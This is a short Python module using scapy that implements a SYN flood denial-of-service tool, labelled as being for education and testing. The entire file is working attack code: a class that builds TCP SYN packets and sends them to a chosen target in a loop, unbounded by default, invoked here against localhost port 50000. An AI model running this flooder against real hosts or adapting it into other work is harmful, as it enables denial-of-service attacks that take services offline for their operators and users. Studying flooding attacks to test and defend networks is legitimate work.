"""
Author: Daniel Sapojnikov.
Syn flood DDoS attack module for education purposes and testing.
"""

from scapy.all import *
from scapy.all import conf
from scapy.layers.inet import IP, TCP

from singleton import Singleton

LOG = '[+]'
ERROR = '[!]'
SYN_FLAG = 0x02

class SynFlood(metaclass=Singleton):
    def __init__(self, target: tuple[str, int]=tuple(), bound: int=-1) -> None:
        """  
        Syn flood object.

        Args:
            target (tuple, optional): Target addr (ip, port) we want to flood. Defaults to Empty tuple.
            bound (_type_, optional): Upper bound of packets. Defaults to None aka infinity.
        """
        self.__bound = bound
        self.__syn_counter = 0
        self.__src_ip = 'localhost'
        self.__dst_ip, self.__dport = target
    
    def __generate_syn(self, src_ip: str='localhost', dst_ip: str='localhost', dport: int=50000) -> scapy.packet:
        """
        Returns:
            scapy.packet: syn packet.
        """
        return IP(src=src_ip, dst=dst_ip) / TCP(dport=dport, flags=SYN_FLAG) 
    
    def __send_syn(self, l=0) -> None:
        """
        Sends a single syn packet to target.
        """ 
        syn_packet = self.__generate_syn(self.__src_ip, self.__dst_ip, self.__dport)
        send(syn_packet, verbose=0)
        self.__syn_counter += 1
        print(f'{LOG} Syn packet sent!')
        
    def start(self) -> None:
        """
        Floods self.__target with syn packets until a bound it met.
        """
        print(f'{LOG} Starting syn flood on {(self.__dst_ip, self.__dport)}')
        try:
            while self.__bound < 0 or self.__syn_counter < self.__bound:
                self.__send_syn()
        except KeyboardInterrupt:
            pass
            print(f'{LOG} Attack stopped! syns: {self.__syn_counter}')

flooder = SynFlood(target=('localhost', 50000))
flooder.start()
        